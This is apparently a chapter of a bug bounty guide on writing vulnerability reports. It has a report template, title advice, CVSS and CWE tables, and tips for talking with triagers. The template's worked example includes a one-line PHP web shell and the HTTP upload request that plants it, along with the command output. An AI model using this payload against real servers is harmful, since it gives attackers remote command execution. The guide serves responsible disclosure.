# Phase 5 — Reporting

> A great bug with a poor report gets triaged as informational. A clear, impact-driven report gets paid fast.

---

## 5.1 Report Structure

```
Title:        [Severity] Vulnerability Type in Component – Impact Summary
              Example: [Critical] Unauthenticated RCE via File Upload in /api/upload

Severity:     Critical / High / Medium / Low
CVSS Score:   X.X (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE:          CWE-78 (OS Command Injection), CWE-79, etc.
Endpoint:     https://target.com/path
Parameter:    [name of vulnerable parameter]
```

---

## 5.2 Full Report Template

```markdown
## Summary

A brief 2-3 sentence description of the vulnerability, where it exists,
and what an attacker can achieve.

Example:
"The `/api/upload` endpoint does not validate file extensions or content types,
allowing an attacker to upload a PHP web shell and execute arbitrary system commands.
This leads to full Remote Code Execution on the application server."

---

## Severity

**Critical** — CVSS Score: 9.8
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

## Vulnerability Details

**Type:** Remote Code Execution (CWE-78)
**Endpoint:** `POST https://target.com/api/upload`
**Authentication Required:** No
**User Interaction Required:** No

---

## Steps to Reproduce

1. Navigate to `https://target.com/upload`
2. Click "Upload File"
3. Intercept the request with Burp Suite
4. Change the filename to `shell.php` and the Content-Type to `image/png`
5. Set file content to: `<?php system($_GET['cmd']); ?>`
6. Forward the request
7. Navigate to `https://target.com/uploads/shell.php?cmd=id`
8. Observe: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## Proof of Concept

[Attach: screenshot-01.png — Burp request with payload]
[Attach: screenshot-02.png — Server response showing command output]
[Attach: poc-video.mp4 — Full walkthrough video]

**Request:**
\```
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
--X--
\```

**Response:**
\```
HTTP/1.1 200 OK
{"status":"ok","file":"uploads/shell.php"}
\```

---

## Impact

An unauthenticated attacker can execute arbitrary operating system commands
as the web server user. This allows:
- Full server compromise
- Data exfiltration (all database credentials, user data)
- Pivot to internal network
- Installation of persistent backdoors

---

## Remediation

1. Validate file extensions against an allowlist (e.g., jpg, png, pdf only)
2. Validate file content (magic bytes / MIME type) server-side
3. Rename uploaded files to random UUIDs
4. Store uploads outside the web root or in object storage (S3)
5. Disable PHP execution in upload directories (`.htaccess`: `php_flag engine off`)

---

## References

- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- CWE-434: Unrestricted Upload of File with Dangerous Type
```

---

## 5.3 Title Writing Guide

**Bad titles:**
- "XSS found"
- "Security issue in login"
- "Vulnerability in API"

**Good titles:**
- `[High] Stored XSS in Profile Bio Allows Admin Account Takeover`
- `[Critical] SSRF in Image Fetcher Exposes AWS EC2 Metadata Credentials`
- `[Medium] IDOR in /api/v1/invoice/{id} Allows Reading Other Users' Invoices`

**Formula:** `[Severity] Vuln Type in Feature/Endpoint → Business Impact`

---

## 5.4 CVSS Quick Reference

| Vector | Values |
|--------|--------|
| Attack Vector (AV) | Network (N) · Adjacent (A) · Local (L) · Physical (P) |
| Attack Complexity (AC) | Low (L) · High (H) |
| Privileges Required (PR) | None (N) · Low (L) · High (H) |
| User Interaction (UI) | None (N) · Required (R) |
| Scope (S) | Unchanged (U) · Changed (C) |
| Confidentiality (C) | None (N) · Low (L) · High (H) |
| Integrity (I) | None (N) · Low (L) · High (H) |
| Availability (A) | None (N) · Low (L) · High (H) |

**Calculator:** https://www.first.org/cvss/calculator/3.1

---

## 5.5 Common CWEs to Reference

| Vulnerability | CWE |
|--------------|-----|
| XSS | CWE-79 |
| SQLi | CWE-89 |
| IDOR | CWE-639 |
| SSRF | CWE-918 |
| CSRF | CWE-352 |
| Open Redirect | CWE-601 |
| RCE / OS Command Injection | CWE-78 |
| File Upload | CWE-434 |
| XXE | CWE-611 |
| Path Traversal | CWE-22 |
| Auth Bypass | CWE-287 |
| Hardcoded Credentials | CWE-798 |
| Missing HTTPS | CWE-319 |
| Weak Password | CWE-521 |

---

## 5.6 Communication Tips

- **Respond to triage questions within 24 hours** — silence gets reports closed
- **Be respectful** — triagers are not your enemy
- **Provide additional evidence when asked** — don't argue severity in first response
- **If severity is downgraded**, provide a clear business impact counter-argument
- **Don't reopen resolved tickets** unless the fix is bypassed

---

## 5.7 Tracking Your Submissions

Maintain a local log:

```
Date       | Program       | Vuln Type  | Severity | Status    | Bounty
-----------|---------------|------------|----------|-----------|-------
2026-01-15 | HackerOne/Acme| XSS        | High     | Resolved  | $1500
2026-01-20 | Bugcrowd/Beta | IDOR       | Medium   | Triaged   | Pending
2026-02-01 | Intigriti/X   | SSRF       | Critical | Open      | -
```

---

## Final Words

```
"The bug is only half the battle.
 The report is what gets you paid."
```
